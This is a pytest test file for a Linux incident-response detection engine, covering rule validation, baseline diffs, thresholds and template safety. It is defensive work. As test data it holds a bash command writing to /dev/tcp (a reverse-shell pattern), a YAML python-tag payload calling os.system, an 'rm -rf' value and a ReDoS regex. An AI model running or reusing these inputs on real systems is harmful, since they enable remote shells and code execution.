from pathlib import Path

import pytest
import yaml

from linux_ir.detections.engine import RuleError, evaluate, load_rules, validate_rule
from linux_ir.evidence.manifest import load_evidence

REPO = Path(__file__).resolve().parents[2]
RULES = REPO / "rules"
CASE = REPO / "examples/synthetic-evidence/case-001"
BASE = REPO / "examples/synthetic-evidence/baseline"


def rule(**over):
    r = {
        "id": "LIR-TEST-001",
        "version": 1,
        "title": "t",
        "description": "d",
        "category": "c",
        "severity": "low",
        "confidence": "low",
        "artifact": "processes",
        "why": "pid {pid}",
        "false_positives": ["fp"],
        "next_steps": ["n"],
        "when": [{"field": "name", "op": "eq", "value": "x"}],
    }
    r.update(over)
    return r


def run(r, records, status="ok", baseline=None):
    rules = [validate_rule(r, "t")]
    return evaluate(rules, {r["artifact"]: {"records": records, "status": status}}, baseline)


def test_shipped_rules_valid_and_complete():
    rules = load_rules(RULES)
    assert len(rules) >= 20
    for r in rules:
        assert r.false_positives and r.next_steps and r.why and r.version >= 1
    assert len({r.id for r in rules}) == len(rules)


def test_synthetic_case_expected_rules_fire():
    arts, _ = load_evidence(CASE)
    base, _ = load_evidence(BASE)
    findings, _ = evaluate(load_rules(RULES), arts, base)
    ids = {f.rule_id for f in findings}
    assert {
        "LIR-PROC-001",
        "LIR-PROC-002",
        "LIR-PROC-003",
        "LIR-PERS-001",
        "LIR-PERS-002",
        "LIR-PERS-003",
        "LIR-PERS-005",
        "LIR-PERS-007",
        "LIR-PERS-008",
        "LIR-PERS-010",
        "LIR-AUTH-001",
        "LIR-AUTH-003",
        "LIR-AUTH-004",
        "LIR-FILE-001",
        "LIR-FILE-002",
        "LIR-FILE-004",
        "LIR-NET-002",
    } <= ids
    f = next(x for x in findings if x.rule_id == "LIR-AUTH-001")
    assert f.evidence["count"] >= 10 and f.severity == "medium" and f.confidence == "medium"
    assert f.classification == "heuristic" and f.attack == ["T1110"]


def test_benign_evidence_produces_no_false_positive():
    recs = [
        {
            "pid": 5,
            "name": "nginx",
            "exe": "/usr/sbin/nginx",
            "exe_deleted": False,
            "cmdline": ["nginx", "-g", "daemon off;"],
        }
    ]
    findings, _ = evaluate(load_rules(RULES), {"processes": {"records": recs, "status": "ok"}}, None)
    assert findings == []


def test_unfamiliar_executable_alone_is_not_flagged():
    arts = {
        "processes": {
            "records": [{"pid": 9, "name": "weird", "exe": "/opt/strange/bin/weird", "cmdline": ["weird"]}],
            "status": "ok",
        }
    }
    assert evaluate(load_rules(RULES), arts, None)[0] == []


def test_baseline_rules_skipped_without_baseline():
    arts, _ = load_evidence(CASE)
    _, notes = evaluate(load_rules(RULES), arts, None)
    assert any("LIR-PERS-003" in n and "no baseline" in n for n in notes)


def test_baseline_changed_detection():
    r = rule(
        artifact="files",
        type="baseline",
        mode="changed",
        key_fields=["path"],
        compare_fields=["sha256"],
        when=[],
        why="{path} changed",
    )
    cur = {"files": {"records": [{"path": "/etc/passwd", "sha256": "b"}], "status": "ok"}}
    old = {"files": {"records": [{"path": "/etc/passwd", "sha256": "a"}], "status": "ok"}}
    f, _ = evaluate([validate_rule(r, "t")], cur, old)
    assert f and f[0].evidence["changed_fields"] == ["sha256"]
    same, _ = evaluate([validate_rule(r, "t")], old, old)
    assert same == []


def test_rules_not_evaluated_when_artifact_failed_or_missing():
    f, notes = run(rule(), [{"name": "x", "pid": 1}], status="failed")
    assert f == [] and "not evaluated" in notes[0]
    f, notes = evaluate([validate_rule(rule(), "t")], {}, None)
    assert f == [] and "not present" in notes[0]


def test_threshold_window():
    r = rule(
        artifact="logs",
        type="threshold",
        group_by="src_ip",
        threshold=3,
        window_seconds=60,
        when=[{"field": "event_type", "op": "eq", "value": "bad"}],
        why="{count} from {group}",
    )

    def ev(ts):
        return {"event_type": "bad", "src_ip": "1.1.1.1", "ts": ts}

    close = [ev("2026-03-10T11:00:00Z"), ev("2026-03-10T11:00:10Z"), ev("2026-03-10T11:00:20Z")]
    assert run(r, close)[0]
    far = [ev("2026-03-10T11:00:00Z"), ev("2026-03-10T11:05:00Z"), ev("2026-03-10T11:10:00Z")]
    assert run(r, far)[0] == []
    assert run(r, [{"event_type": "bad", "src_ip": "1.1.1.1"}] * 5)[0] == []  # no timestamps: cannot threshold


@pytest.mark.parametrize(
    "bad",
    [
        {"id": "bad-id"},
        {"severity": "urgent"},
        {"confidence": "sure"},
        {"false_positives": []},
        {"unknown_key": 1},
        {"when": [{"field": "x", "op": "exec", "value": "rm -rf"}]},
        {"when": [{"field": "x y", "op": "eq", "value": 1}]},
        {"when": [{"field": "x", "op": "regex", "value": "(a+)+$"}]},
        {"when": [{"field": "x", "op": "regex", "value": "a" * 300}]},
        {"when": [{"field": "x", "op": "regex", "value": "["}]},
        {"when": [{"field": "x", "op": "in", "value": "str"}]},
        {"when": []},
        {"attack": ["X1"]},
        {"type": "code"},
        {"version": 0},
    ],
)
def test_invalid_rules_rejected(bad):
    with pytest.raises(RuleError):
        validate_rule(rule(**bad), "t")


def test_rule_file_errors(tmp_path):
    (tmp_path / "a.yaml").write_text("rules: not-a-list")
    with pytest.raises(RuleError):
        load_rules(tmp_path)
    (tmp_path / "a.yaml").write_text("!!python/object/apply:os.system ['id']")
    with pytest.raises(RuleError):  # safe_load refuses python tags: no code execution
        load_rules(tmp_path)
    with pytest.raises(RuleError):
        load_rules(tmp_path / "nope")


def test_duplicate_rule_ids(tmp_path):
    (tmp_path / "a.yaml").write_text(yaml.safe_dump({"rules": [rule(), rule()]}))
    with pytest.raises(RuleError, match="duplicate"):
        load_rules(tmp_path)


def test_finding_cap_and_template_safety():
    r = rule(why="{__class__} {pid}")
    recs = [{"name": "x", "pid": i} for i in range(500)]
    f, notes = evaluate([validate_rule(r, "t")], {"processes": {"records": recs, "status": "ok"}}, None, max_per_rule=5)
    assert len(f) == 5 and "cap" in notes[0]
    assert "<unavailable>" in f[0].why and "<class" not in f[0].why


def test_list_values_matching():
    r = rule(when=[{"field": "cmdline", "op": "contains_any", "value": ["/dev/tcp/"]}])
    assert run(r, [{"pid": 1, "cmdline": ["bash", "-c", "x > /dev/tcp/1.2.3.4/1"]}])[0]
    assert run(r, [{"pid": 1, "cmdline": ["ls"]}])[0] == []
    assert run(r, [{"pid": 1}])[0] == []  # missing field: no match, no crash
